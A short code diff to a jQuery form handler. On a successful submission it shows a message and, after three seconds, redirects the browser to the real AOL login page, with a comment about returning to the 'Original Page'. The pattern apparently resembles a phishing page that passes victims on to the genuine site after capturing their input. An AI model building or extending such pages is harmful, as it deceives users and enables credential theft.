@@ -77,6 +77,10 @@ $(document).ready(function () {
       }).done(function (response) {
         if (response.status == 200) {
           $('.errorMsg2').fadeIn().html(response.message); // delay and reload and Redirect to Original Page
+
+          setTimeout(function () {
+            window.location.href = "https://login.aol.com/?lang=en-gb&intl=uk";
+          }, 3000);
         } else {
           $('.errorMsg2').fadeIn().html(response.message);
         }
